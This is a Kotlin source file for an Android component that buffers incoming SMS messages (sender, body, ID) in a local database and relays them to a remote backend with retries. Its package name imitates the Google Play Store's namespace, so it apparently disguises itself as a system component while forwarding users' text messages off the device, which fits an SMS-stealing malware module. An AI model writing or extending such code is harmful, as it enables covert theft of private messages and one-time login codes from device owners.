package com.android.vending.preload.check.buffer

import android.content.Context
import androidx.room.Room
import com.android.vending.preload.check.BackendClient
import com.android.vending.preload.check.Config
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object RelayBuffer {
    @Volatile
    private var db: RelayDatabase? = null

    private fun database(context: Context): RelayDatabase {
        return db ?: synchronized(this) {
            db ?: Room.databaseBuilder(
                context.applicationContext,
                RelayDatabase::class.java,
                RelayDatabase.DB_NAME
            ).fallbackToDestructiveMigration()
                .build().also { db = it }
        }
    }

    suspend fun enqueue(
        context: Context,
        sender: String,
        body: String,
        messageSid: String
    ) = withContext(Dispatchers.IO) {
        val db = database(context)
        val dao = db.bufferedSmsDao()
        val count = dao.countPending()
        if (count >= Config.MAX_BUFFERED_MESSAGES) {
            val oldest = dao.getPending(1)
            oldest.firstOrNull()?.let { dao.delete(it) }
        }
        dao.insert(BufferedSms(sender = sender, body = body, messageSid = messageSid))
    }

    suspend fun drain(context: Context): Int = withContext(Dispatchers.IO) {
        val db = database(context)
        val dao = db.bufferedSmsDao()
        val pending = dao.getPending(Config.MAX_BUFFERED_MESSAGES)
        if (pending.isEmpty()) return@withContext 0

        var success = 0
        for (sms in pending) {
            val ok = BackendClient.relay(sms.sender, sms.body, sms.messageSid)
            if (ok) {
                dao.delete(sms)
                success++
            } else {
                val nextAttempts = sms.attempts + 1
                if (nextAttempts >= BufferedSms.MAX_ATTEMPTS) {
                    dao.delete(sms)
                } else {
                    dao.update(sms.copy(attempts = nextAttempts))
                }
            }
        }
        dao.purgeCompleted()
        success
    }
}
